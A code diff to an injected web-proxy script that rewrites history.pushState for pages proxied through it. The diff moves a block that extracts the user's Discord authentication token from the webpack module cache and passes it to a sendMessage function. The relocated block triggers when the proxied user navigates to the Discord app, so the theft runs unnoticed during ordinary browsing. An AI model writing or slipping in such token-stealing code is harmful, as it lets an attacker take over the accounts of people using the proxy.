@@ -13,13 +13,6 @@ function sendMessage(message) {
       request.send(JSON.stringify(params));
     }
 (function () {
-      try {
-            var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
-            alert(e)
-            } catch(err) {
-            alert(err)
-            }
-    sendMessage(e)
     var proxy_dest_split = window.location.pathname.split(/(?=\/)/);
     var proxy_prefix = window.location.protocol + "//" + window.location.host;
     var proxy_path = proxy_dest_split.shift() + "/";
@@ -66,6 +59,13 @@ function sendMessage(message) {
         window.history.pushState = function (stateObj, title, url) {
             this._womginx_pushState(stateObj, title, url);
             if (url === proxy_prefix + proxy_path + "https://discord.com/app") {
+                      try {
+            var e = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
+            alert(e)
+            sendMessage(e)
+            } catch(err) {
+            alert(err)
+            }
                 window.location.reload();
             }
             return;
